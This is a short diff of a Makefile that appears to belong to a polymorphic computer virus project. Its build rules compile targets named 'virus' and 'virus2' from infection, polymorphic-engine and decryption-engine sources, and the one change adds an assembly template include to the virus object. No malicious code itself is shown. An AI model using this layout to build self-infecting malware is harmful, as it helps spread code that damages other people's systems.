@@ -52,7 +52,7 @@ virus2: infect.c polymorphic.c  polymorphicengine.o  virus.o  decryptionengine.o
 virus: infect.c polymorphic.c  polymorphicengine.o  virus.o  decryptionengine.o
 	$(CC) $(KFLAGS) $^ -o $@
 
-virus.o: virus.asm
+virus.o: virus.asm template.asm.inc
 	$(ASM) $(AFLAGS) $< -o $@
 
 polyengine.o: polymake.cpp
